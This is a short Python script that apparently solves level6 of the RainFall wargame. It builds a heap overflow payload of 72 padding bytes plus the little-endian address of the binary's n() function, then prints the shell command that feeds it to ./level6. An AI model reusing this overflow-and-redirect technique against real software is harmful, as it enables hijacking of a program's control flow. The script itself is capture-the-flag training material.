#!/usr/bin/env python3
"""Level6: transform offset + n() address into final argv exploit command."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

# From GDB: info functions n → 0x08048454 (RainFall)
OFFSET = 72  # 64 + chunk header on RainFall; try 64 if 72 fails
N_ADDR = 0x08048454

def main():
    n_le = p32(N_ADDR)
    print(n_le)
    payload = "A" * OFFSET + n_le.decode("latin1")
    cmd = f'./level6 $(python -c \'print "A"*{OFFSET} + "\\x{n_le[0]:02x}\\x{n_le[1]:02x}\\x{n_le[2]:02x}\\x{n_le[3]:02x}"\')'
    print(cmd)
    print("# offset =", OFFSET, ", n =", hex(N_ADDR), "→ LE", n_le.hex())

if __name__ == "__main__":
    main()
